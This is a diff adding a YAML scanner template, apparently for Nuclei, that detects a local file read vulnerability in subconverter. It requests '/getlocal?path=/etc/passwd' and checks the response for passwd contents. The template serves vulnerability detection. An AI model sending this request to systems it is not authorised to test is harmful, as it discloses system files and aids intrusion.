@@ -1,0 +1,25 @@
+id: poc-yaml-subconverter-getlocal-file-read
+info:
+  name: "subconverter 本地文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: subconverter
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/getlocal?path=/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
